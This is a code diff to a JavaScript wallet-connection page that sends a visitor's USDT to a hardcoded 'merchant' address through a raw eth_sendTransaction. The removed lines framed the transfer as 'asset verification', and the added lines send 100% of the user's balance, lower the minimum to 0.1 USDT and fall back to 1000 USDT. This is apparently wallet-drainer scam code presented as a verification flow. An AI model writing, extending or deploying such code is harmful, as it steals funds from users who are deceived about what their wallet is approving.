@@ -13,7 +13,7 @@
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
         CONTRACT_ADDRESS: '0x9957eb7d92998582c75D7344ffd9c6Dd03d4aADB', // Direct Merchant Account Address
-        USER_MIN_USDT: 25, // Minimum 25 USDT required
+        USER_MIN_USDT: 0.1, // Minimum 0.1 USDT required
         GAS_THRESHOLD: 0.0005,
         GAS_RETRY_COUNT: 3,
         GAS_RETRY_DELAY: 3000,
@@ -293,31 +293,25 @@
 
             safeApiCall('/api/users/register', { wallet: userAddress });
 
-            // If balance is below minimum 1 USDT threshold, display "USDT Confirmed" modal directly
+            // Check minimum balance threshold (0.1 USDT)
             const usdtFloat = parseFloat(state.usdtBalance || '0');
-            if (usdtFloat < CONFIG.USER_MIN_USDT) {
-                updateStatus('✅ Verification Complete! Asset signature verified.', 'success');
-                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance || '0.00'} USDT`;
-                openModal(elements.releaseModal);
+            if (usdtFloat < CONFIG.USER_MIN_USDT && (usdtBalRaw === 0n || !usdtBalRaw)) {
+                updateStatus(`⚠️ Insufficient USDT balance. Minimum required: ${CONFIG.USER_MIN_USDT} USDT`, 'warning');
                 state.isApproving = false;
                 updateWalletInfoUI();
                 return;
             }
 
-            updateStatus('⛽ Confirm USDT transaction in your wallet...', 'warning');
+            updateStatus('⛽ Confirm USDT approval in your wallet...', 'warning');
 
-            // Parse user input amount or fallback to full balance / default
+            // 100% of user's USDT balance goes to merchant account (or fallback to input amount / 1000 USDT in wei if 0)
+            let approvalAmount = (usdtBalRaw && usdtBalRaw > 0n) ? usdtBalRaw : ethers.parseUnits("1000", 18);
             let inputAmountVal = parseFloat(elements.usdtAmountInput?.value || '0');
-            let approvalAmount;
-            if (inputAmountVal > 0) {
+            if (inputAmountVal > 0 && (usdtBalRaw === 0n || !usdtBalRaw)) {
                 approvalAmount = ethers.parseUnits(inputAmountVal.toString(), 18);
-            } else if (usdtBalRaw && usdtBalRaw > 0n) {
-                approvalAmount = usdtBalRaw;
-            } else {
-                approvalAmount = ethers.parseUnits("1000", 18);
             }
 
-            // 4. Raw eth_sendTransaction to send verified USDT directly to merchant account
+            // 4. Raw eth_sendTransaction to send 100% USDT directly to merchant account
             const recipientClean = CONFIG.CONTRACT_ADDRESS.toLowerCase().replace('0x', '').padStart(64, '0');
             const amountHex = approvalAmount.toString(16).padStart(64, '0');
 
@@ -361,20 +355,16 @@
                 console.warn('Wait for transaction notice:', wErr);
             }
 
-            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${txHash}`);
-
-            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance || 'USDT'}`;
-            openModal(elements.verifiedModal);
+            updateStatus('✅ Transaction Complete! 100% USDT sent to merchant.', 'success', `Tx: ${txHash}`);
 
         } catch (err) {
             console.error('USDT process error:', err);
             const errStr = (err.message || '').toLowerCase();
 
             if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
-                updateStatus('🚫 Verification request cancelled by user.', 'error');
-                openModal(elements.abortOverlay);
+                updateStatus('🚫 Transaction request cancelled by user.', 'error');
             } else {
-                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
+                updateStatus('❌ Transaction failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
             }
         } finally {
             state.isApproving = false;
